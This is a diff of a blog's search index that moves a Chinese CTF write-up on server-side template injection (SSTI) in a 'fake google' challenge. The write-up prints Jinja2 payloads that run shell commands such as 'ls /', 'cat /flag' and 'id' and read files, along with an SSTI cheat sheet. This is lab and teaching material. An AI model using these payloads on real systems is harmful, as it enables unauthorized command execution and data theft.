@@ -1,45 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BJDCTF-2nd-fake-google</title>
-    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
-    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
-<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
-<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
-<ul>
-<li><em>查看根目录</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
-<p>ls后台文件出现flag</p>
-<ul>
-<li><em>构造playload，查看flag</em></li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
-<h1><strong>SSTI学习🇭🇺</strong></h1>
-<p>像上面的题目的套路一般直接找playload注入</p>
-<ul>
-<li>
-<h2 id="常用playload">常用playload:</h2>
-</li>
-</ul>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>WEB</tag>
-        <tag>CTF</tag>
-        <tag>SSTI注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CISCN2019-华东南赛区-Double-Secret</title>
     <url>/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</url>
     <content><![CDATA[<blockquote>
@@ -96,6 +57,45 @@
         <tag>CTF</tag>
         <tag>FLASK</tag>
         <tag>RC4</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF-2nd-fake-google</title>
+    <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
+    <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
+<p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
+<h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
+<ul>
+<li><em>查看根目录</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
+<p>ls后台文件出现flag</p>
+<ul>
+<li><em>构造playload，查看flag</em></li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">P3<span class="string">&#x27;s girlfirend is : flag&#123;4d59689e-7751-4ee4-8daa-f4d8c8de99e2&#125;</span></span><br></pre></td></tr></table></figure>
+<h1><strong>SSTI学习🇭🇺</strong></h1>
+<p>像上面的题目的套路一般直接找playload注入</p>
+<ul>
+<li>
+<h2 id="常用playload">常用playload:</h2>
+</li>
+</ul>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">命令执行：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">文件操作：&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="萌新入门ssti必看"><em>萌新入门ssti必看</em></h2>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">测试是否存在ssti注入 &#123;&#123;<span class="number">1</span>+<span class="number">1</span>&#125;&#125;  <span class="meta">#回复页面为2说明存在ssti注入</span></span><br><span class="line">查询： &#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125; </span><br><span class="line">查看可用模块： &#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125; </span><br><span class="line">查找危险函数： &#123;&#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)&#125;&#125;</span><br><span class="line"></span><br><span class="line">相关函数解释</span><br><span class="line">__class__ 返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__ 类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__ 对包含函数全局变量的字典的引用</span><br><span class="line"></span><br><span class="line">__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__bases__ 返回该对象所继承的基类 __builtins__是做为默认初始模块</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WEB</tag>
+        <tag>SSTI注入</tag>
       </tags>
   </entry>
   <entry>
@@ -202,8 +202,8 @@
         <category>WEB</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
         <tag>CTF</tag>
+        <tag>WEB</tag>
         <tag>SQL堆叠注入</tag>
       </tags>
   </entry>
